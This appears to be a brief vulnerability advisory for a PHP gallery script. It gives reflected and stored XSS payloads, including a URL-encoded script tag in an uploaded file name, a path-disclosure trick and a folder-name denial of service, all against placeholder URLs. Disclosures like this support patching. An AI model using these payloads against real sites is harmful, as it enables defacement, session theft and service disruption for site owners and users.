Home: http://black-dwarf.com
HS: http://www.hotscripts.com/Detailed/86225.html
Found by: Anarchy Angel - http://hha.zapto.org

Temp XSS: http://site.com/phpg/index.php?url=&quot;&gt; [XSS]

Temp XSS: http://site/com/phpg/main-display-file.php?file= [XSS]

Path disclosure: http://site/com/phpg/main-display-file.php?file= [anarchything] .jpg&lt;BR&gt;
As long as the img/vid file does not exist you will get file path.

Static XSS/Path disclosure: Uploading a file with % 3Cscript% 3Ealert% 28% 22Hacked% 20by% 20Anarchy% 20Angel% 22% 29% 3B% 3C% 2Fscript% 3E.jpg as its name &quot;with out the spaces&quot; Will give a path disclosure on the main page and a XSS when you view the file.

DoS: Make a new folder with &lt; script &gt;alert('Hacked by Anarchy Angel') and you will no longer be able to use the app, you can also just rename a folder to do the same thing.
